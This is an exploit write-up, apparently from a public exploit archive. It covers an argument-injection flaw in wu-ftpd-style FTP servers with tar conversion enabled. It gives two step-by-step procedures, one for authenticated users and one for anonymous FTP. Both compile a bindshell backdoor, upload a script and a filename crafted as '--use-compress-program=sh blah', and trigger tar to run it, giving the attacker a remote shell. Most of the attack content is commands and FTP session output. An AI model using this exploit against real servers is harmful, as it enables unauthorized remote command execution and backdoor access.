@@ -1,0 +1,101 @@
+source: http://www.securityfocus.com/bid/2240/info
+
+Some FTP servers provide a "conversion" service that pipes a requested file through a program, for example a decompression utility such as "tar", before it is passed to the remote user. Under some configurations where this is enabled a remote user can pass a filename beginning with a minus sign to FTP, which will pass this as an argument to the compression/archiver program (where it will be erroneously treated as a command line argument other than a filename). It may be possible to exploit this and execute commands on a remote machine. An example of this exploits the "--use-compress-program PROG" parameter passed to tar; if PROG refers to a program that is accessible to the FTP server, it will be executed. The remote user must have access to a writeable directory in order to exploit this. See exploit for details. 
+
+With a valid FTP account only the server, the difficulty goes right down. You also have the added
+benefit of not being stuck in a chroot() environment at the end. Local exploit time.
+
+The exploit goes along much the same lines as the anonymous FTP exploit does:
+
+Create a backdoor, using bindshell from our previous example:
+
+$ gcc bindshell.c -o b -static
+
+If you can perform a SITE CHMOD (default for normal non-anon users on wu-ftpd), then you can
+use the following script example. Create a script to exec the desired commands:
+
+$ cat > blah
+#!/bin/bash
+./b &
+^D
+
+Now create empty file "--use-compress-program=bash blah"
+
+$ > "--use-compress-program=bash blah"
+
+FTP to your target, login with your username/password. Upload your 3 files:
+
+ftp> put b
+ftp> put blah
+ftp> put "--use-compress-program=bash blah"
+
+Do a SITE CHMOD for b and blah:
+
+ftp> quote SITE CHMOD 0755 b
+ftp> quote SITE CHMOD 0755 blah
+
+Now get your file:
+
+ftp> get "--use-compress-program=bash blah".tar
+
+Thats all there is to it. You now should have a shell on whatever port you specified.
+
+---
+
+An alternative exploit that bypasses the need to use SITE CHMOD has been suggested by SecuriTeam.com (this can be accomplished over anonymous FTP):
+
+"This vulnerability is simple to exploit. However to exploit it you must be able to upload/download files. (e.g. a mode 0777 incoming directory).
+
+For the purposes of this exploit you also need a shell in the remote path. For example, a RedHat machine with the anonftp package installed has exactly what you need.
+
+First, assuming you are running the same platform as your target, statically compile some sort of backdoor program. A simple example is bindshell.c.
+
+$ gcc bindshell.c -o b -static
+
+Then, tar this up. You will need to tar it up because the remote side will rarely have the ability to change permissions at this stage.
+(SITE CHMOD rarely works on anonymous ftp sites)
+
+$ tar -cf b.tar b
+
+Create a script of things you want to do on the remote site, this will be interpreted by bash or sh.
+
+$ cat > blah
+#
+/bin/tar -xf b.tar
+./b
+^D
+
+Leave the first line as a comment.
+
+Create a empty file called "--use-compress-program=sh blah"
+
+$ > "--use-compress-program=sh blah"
+
+Connect to your target ftp server.
+
+$ ftp localhost
+Connected to localhost.
+220 localhost.localdomain FTP server (Version wu-2.6.0(1) Tue Sep 21 10:10:10 EDT 2000) ready.
+Name (localhost:suid): ftp
+331 Guest login ok, send your complete e-mail address as password.
+Password:
+230 Guest login ok, access restrictions apply.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+
+Change to your world writeable directory:
+
+ftp> cd /incoming
+
+Store your files:
+
+ftp> put blah
+ftp> put b.tar
+ftp> put "--use-compress-program=sh blah"
+
+Now using TAR conversion, get your "--use-compress-program=sh blah" file.
+
+ftp> get "--use-compress-program=sh blah".tar
+
+It should open a connection then freeze. Now telnet to your bindshell port." 
